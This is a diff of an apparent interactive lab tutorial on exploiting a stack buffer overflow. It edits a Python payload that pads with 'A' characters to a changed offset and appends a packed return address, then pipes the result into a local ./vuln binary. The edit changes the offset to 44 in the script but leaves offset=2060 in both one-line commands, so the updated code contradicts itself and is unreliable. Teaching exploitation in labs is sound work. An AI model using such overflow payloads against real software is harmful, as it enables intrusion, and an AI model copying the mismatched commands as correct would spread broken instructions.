@@ -55,14 +55,14 @@ Let's consider the below code:
 
 ```python
 import struct
-offset 	= 2060
-rip	= struct.pack('<I', 0x80492ee)
+offset 	= 44
+rip	= struct.pack('<I', 0x80491f7)
 payload = 'A'*offset + rip
 print(payload)
 ```{{copy}}
 
-We can execute it in just one line of code: `python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80492ee);payload = 'A'*offset + rip;print(payload)"`{{execute}}
+We can execute it in just one line of code: `python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80491f7);payload = 'A'*offset + rip;print(payload)"`{{execute}}
 
-Does the exploit work? Which of the below command we need to type to make it work?
+Does the below exploit work?
 
-`echo $(python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80492ee);payload = 'A'*offset + rip;print(payload)") | ./vuln`{{execute}}
+`echo $(python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80491f7);payload = 'A'*offset + rip;print(payload)") | ./vuln`{{execute}}
